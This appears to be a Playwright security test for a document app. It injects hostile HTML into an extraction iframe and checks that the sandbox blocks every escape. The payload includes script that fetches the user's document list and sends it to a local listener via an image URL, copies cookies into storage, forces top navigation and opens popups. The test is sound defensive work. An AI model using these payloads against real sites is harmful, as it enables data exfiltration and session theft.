// Manual browser check that the extraction frame is inert even if hostile HTML got past the worker's sanitiser: the real built app, a real signed-in owner session, the real worker,
// and one document whose page HTML is replaced in flight by markup that tries every way out. A local listener counts anything that reaches the network.
//   node e2e/iframe-safety.mjs <hub port> <directory with complex.pdf>
import { chromium } from '@playwright/test';
import http from 'node:http';

const [port, samples] = process.argv.slice(2);
const base = `http://127.0.0.1:${port}/web/`;
const hits = [];
const listener = http.createServer((req, res) => { hits.push(`${req.method} ${req.url}`); res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<p>external</p>'); });
await new Promise((resolve) => listener.listen(0, '127.0.0.1', resolve));
const L = `http://127.0.0.1:${listener.address().port}`;

const HOSTILE = `<style>@import url(${L}/import);body{background:url(${L}/bg)}</style>
<link rel="stylesheet" href="${L}/css"><meta http-equiv="refresh" content="0;url=${L}/refresh"><base href="${L}/base/">
<img src="${L}/img" onerror="parent.__pwned='img'"><iframe src="${L}/iframe"></iframe><object data="${L}/object"></object><embed src="${L}/embed"><video src="${L}/video"></video>
<form id="f" action="${L}/form" method="post"><input name="a" value="1"></form>
<a id="a" href="${L}/anchor" target="_top">top link</a><a id="b" href="${L}/anchor2">plain link</a>
<script>
  parent.__pwned = 'script'; top.__pwned = 'script';
  try { top.location = '${L}/top'; } catch (e) {}
  try { fetch('${L}/fetch'); fetch('/document-library/documents').then(r => r.text()).then(t => new Image().src = '${L}/exfil?' + encodeURIComponent(t)); } catch (e) {}
  try { new XMLHttpRequest().open('GET', '${L}/xhr'); } catch (e) {}
  try { window.open('${L}/popup'); } catch (e) {}
  try { document.getElementById('f').submit(); } catch (e) {}
  try { document.getElementById('a').click(); } catch (e) {}
  try { localStorage.setItem('x', document.cookie); } catch (e) {}
</script>
<p id="visible">Hostile page text stays visible as text.</p>`;

const browser = await chromium.launch();
const results = [];
const note = (ok, label) => { results.push(ok); console.log(`${ok ? 'ok  ' : 'FAIL'} ${label}`); };
for (const [name, viewport] of [['desktop', { width: 1280, height: 900 }], ['mobile', { width: 390, height: 844 }]]) {
  hits.length = 0;
  const context = await browser.newContext({ viewport });
  const page = await context.newPage();
  const popups = [];
  context.on('page', (p) => popups.push(p.url()));
  const dialogs = [];
  page.on('dialog', (d) => { dialogs.push(d.message()); void d.dismiss(); });
  await page.goto(base + '#/login');
  await page.getByLabel(/username/i).fill('owner');
  await page.getByLabel(/password/i).fill('correct-password');
  await page.getByRole('button', { name: /sign in/i }).click();
  await page.getByRole('navigation', { name: 'Main' }).waitFor();
  await page.route('**/document-library/documents/*/inspect/pages/*', async (route) => {
    if (route.request().url().includes('/image')) return route.continue();
    const real = await route.fetch();
    const body = await real.json();
    body.html = HOSTILE;
    body.markdown = '<script>parent.__pwned="markdown"</script> ' + body.markdown;
    await route.fulfill({ response: real, json: body });
  });
  await page.getByRole('link', { name: 'Documents' }).click();
  await page.setInputFiles('input[type=file]', `${samples}/complex.pdf`);
  await page.getByLabel('Title (optional)').fill(`Hostile ${name}`);
  await page.getByRole('button', { name: 'Upload' }).click();
  const article = page.getByRole('article', { name: new RegExp(`Hostile ${name}`) });
  await article.getByText(/●\s*Ready/).first().waitFor({ timeout: 240000 });
  const before = page.url();
  await article.getByRole('button', { name: 'Inspect extraction' }).click();
  const frame = page.locator('iframe[title^="Extracted page 1"]');
  await frame.waitFor();
  await page.waitForTimeout(3000);
  const inner = frame.contentFrame();
  note((await inner.locator('#visible').innerText()) === 'Hostile page text stays visible as text.', `${name}: the hostile page's text is shown (as text)`);
  await inner.locator('#b').click({ force: true, timeout: 2000 }).catch(() => {});
  await inner.locator('#a').click({ force: true, timeout: 2000 }).catch(() => {});
  await page.waitForTimeout(1500);
  note(hits.length === 0, `${name}: nothing reached the network from the frame (${hits.length} hits${hits.length ? ': ' + JSON.stringify(hits) : ''})`);
  note((await page.evaluate(() => window.__pwned)) === undefined, `${name}: no script ran with access to the page (window.__pwned undefined)`);
  note(page.url() === before, `${name}: the page did not navigate (${page.url() === before ? 'same URL' : page.url()})`);
  note(popups.length === 0 && dialogs.length === 0, `${name}: no popups or dialogs`);
  note((await frame.getAttribute('sandbox')) === '', `${name}: sandbox attribute is empty (no permissions)`);
  note(await page.evaluate(() => document.querySelector('#visible') === null && document.querySelector('#a, #b, #f') === null && document.querySelectorAll('script:not([src])').length === 0), `${name}: none of the extraction's elements or scripts are in the page's own DOM (it lives only in the frame's srcdoc)`);
  await inner.locator('body').waitFor({ timeout: 2000 }).catch(() => {});
  note((await frame.evaluate((f) => { try { return f.contentDocument === null; } catch { return true; } })) === true, `${name}: the parent cannot read into the frame (opaque origin)`);
  await page.getByRole('tab', { name: 'Markdown' }).click();
  note((await page.evaluate(() => window.__pwned)) === undefined && (await page.locator('pre').innerText()).includes('<script>'), `${name}: markdown with a script tag is shown as literal text`);
  await context.close();
}
await browser.close();
listener.close();
process.exit(results.every(Boolean) ? 0 : 1);
